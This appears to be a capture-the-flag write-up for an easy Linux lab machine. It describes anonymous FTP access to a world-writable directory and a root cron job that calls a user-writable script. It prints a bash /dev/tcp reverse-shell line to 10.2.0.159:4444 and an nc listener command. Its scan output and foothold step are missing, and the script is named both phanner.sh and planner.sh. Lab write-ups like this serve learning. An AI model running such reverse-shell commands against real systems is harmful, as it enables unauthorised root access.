This is an easy `linux` machine. 
I start by doing an `nmap` scan.
```

```
Here we have Anonymous ftp access. However the interesting part is the `/ftp` director has `rwx` permission for everyone! So that means, if we can find a way to execute files from this directory, we can get a reverse shell!

Doing a simple `gobuster` search, I find that there is `/files` endpoint that shows all the files/directories of the ftp root folder in the browser. So, this means we can "execute" or "access" a file via browser. 


Beautify the shell a bit:
`python3 -c 'import pty; pty.spawn("/bin/bash")'`


# Privilege Escalation
There seems some files in the home folder of `lennie`.
In the `scripts` folder, we see `phanner.sh`:
```bash
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```
It is essentially executing `/etc/print.sh` script. Checking this files permissions, we see it is owned by `lennie` and so we can edit it! Welp, in that case, we can simply ask this sh to give us a reverse shell and as the caller `planner.sh` is owned by root and hence run by root, we can get a root shell! Nice.
```bash
bash -c "bash -i >& /dev/tcp/10.2.0.159/4444 0>&1"
echo 'Done!'
```

I open `nc` on my local machine (`rlwrap nc -nvlp 4444`) and wait for the root to execute the script as part of its `cron` job.
``